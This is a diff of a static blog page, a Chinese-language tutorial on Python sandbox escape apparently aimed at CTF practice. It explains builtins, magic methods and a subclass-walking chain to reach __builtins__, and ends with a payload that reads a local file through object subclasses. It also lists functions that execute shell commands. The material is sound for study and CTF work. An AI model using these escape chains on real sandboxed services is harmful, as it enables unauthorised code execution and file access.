@@ -19,7 +19,7 @@
      <div class="header">
       <div class="logo_title">
 		  
-        <div class="title animated fadeInDown"><img src="https://p1and.github.io/images/avatar.png?v=1625454741362"/>
+        <div class="title animated fadeInDown"><img src="https://p1and.github.io/images/avatar.png?v=1625729119097"/>
 
           <h1 title="P1and" class="weaklink"><a href="/">P1and</a>
 
@@ -171,9 +171,9 @@
 
 
   <div class="post_content markdown"><p class="md_block">
-    <span class="md_line md_line_start md_line_end"><p>所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。<br>
-python 沙箱逃逸的一些方法<br>
-我们通常所说的 Python 沙箱逃逸就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。<br>
+    <span class="md_line md_line_start md_line_end"><p>所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。</p>
+<h3 id="python-沙箱逃逸的一些方法">python 沙箱逃逸的一些方法</h3>
+<p>我们通常所说的 Python 沙箱逃逸就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。<br>
 在 Python 的内置函数中，有一些函数可以帮助我们实现任意命令执行：</p>
 <pre><code>os.system()；os.popen()
 commands.getstatusoutput()；commands.getoutput()
@@ -181,7 +181,7 @@ commands.getstatus()
 subprocess.call(command, shell=True)；subprocess.Popen(command, shell=True)
 pty.spawn()
 </code></pre>
-<h1 id="导入库文件函数">导入库文件（函数）</h1>
+<h3 id="导入库文件函数">导入库文件（函数）</h3>
 <p>通常有三种方法导入库文件：</p>
 <pre><code>#  导入xxx库文件
 1、import xxx
@@ -190,12 +190,35 @@ pty.spawn()
 #  动态加载xxx类和函数 
 3、__import__('xxx')
 </code></pre>
-<p>#python内置函数<br>
-当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。我们可以通过可以通过 <code>dir __builtin__</code>来获取内置函数列表：<br>
+<h3 id="python内置函数">python内置函数</h3>
+<p>当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。我们可以通过可以通过 <code>dir __builtin__</code>来获取内置函数列表：<br>
 <img src="https://p1and.github.io/post-images/1625452514842.png" alt="" loading="lazy"><br>
 从里面我们可以看到一些我们经常用到的函数：<code>open()</code>,<code>eval()</code>,<code>len()</code>,<code>__import__</code>,以及我们刚才用的<code>dir()</code>函数，还有我们要用的一些对象诸如<code>list</code>,<code>dict</code>,<code>tuple</code>,<code>int</code>,<code>float</code>这些，然后还有一些异常啥的。当然，这里面最关键的就是<code>__import__</code>了，可以使用import函数的话，就可以导入任意模块了。<br>
-如果一些 内敛函数在 builtins 删除 ，我们可以通过 reload(<strong>builtins</strong>) 重新载入获取一个完整的 builtins<br>
-常见payload：</p>
+如果一些 内敛函数在 builtins 删除 ，我们可以通过 reload(<strong>builtins</strong>) 重新载入获取一个完整的 builtins</p>
+<h3 id="魔术方法">魔术方法</h3>
+<pre><code>__class__ #返回type类型，查看对象的类型
+__bases__ #返回tuple类型，列出该类的基类
+__mro__   #返回tuple类型，给出解析方法调用的顺序
+__subclasses__() #返回内建方法builtin_function_or_method，获取一个类的子类
+__globals__ #返回dict类型，对函数进行操作，获取当前空间下能使用的模块、方法、变量
+</code></pre>
+<p>利用思路一般是先多获取基类，在获取其子类，之后寻找重载过的 init 类，再用 builtins 查看引用，最后在其中寻找可利用的函数。<br>
+假设我们要读取本地的一个文件，尝试构造利用链。</p>
+<h4 id="获取基类">获取基类</h4>
+<p>python2.x和python3.x 有点不同，需要主意：</p>
+<pre><code>''.__class__.__mro__
+</code></pre>
+<h4 id="获取-object-的子类">获取 object 的子类</h4>
+<pre><code>''.__class__.__mro__[1].__subclasses__()
+</code></pre>
+<h4 id="寻找重载过的-init-类即其中不包含-wrapper-字样可以用循环输出所有的">寻找重载过的 init 类，即其中不包含 wrapper 字样，可以用循环输出所有的:</h4>
+<pre><code>for i in range(0, len(''.__class__.__mro__[1].__subclasses__())):
+    print(''.__class__.__mro__[1].__subclasses__()[i].__init__)
+</code></pre>
+<h4 id="查看其引用">查看其引用</h4>
+<pre><code>''.__class__.__mro__[1].__subclasses__()[134].__init__.__globals__['__builtins__']
+</code></pre>
+<p>常见payload：</p>
 <pre><code>#读文件
 ().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
 
